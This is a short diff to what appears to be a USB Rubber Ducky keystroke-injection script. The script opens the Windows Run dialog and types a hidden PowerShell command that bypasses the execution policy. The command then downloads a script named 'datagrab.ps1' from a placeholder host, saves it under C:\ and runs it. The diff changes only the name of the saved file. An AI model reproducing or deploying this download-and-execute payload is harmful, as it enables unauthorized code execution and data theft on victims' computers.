@@ -8,7 +8,7 @@ DEFAULTDELAY 15
 REM Setting up command in PS
 GUI r
 DELAY 200
-STRING powershell /w 1 /C Set-ExecutionPolicy Bypass;wget "<HOSTED URL>/datagrab.ps1" -o C:\\d.ps1;C:\\d.ps1
+STRING powershell /w 1 /C Set-ExecutionPolicy Bypass;wget "<HOSTED URL>/datagrab.ps1" -o C:\\2643.ps1;C:\\2643.ps1
 DELAY 500
 
 
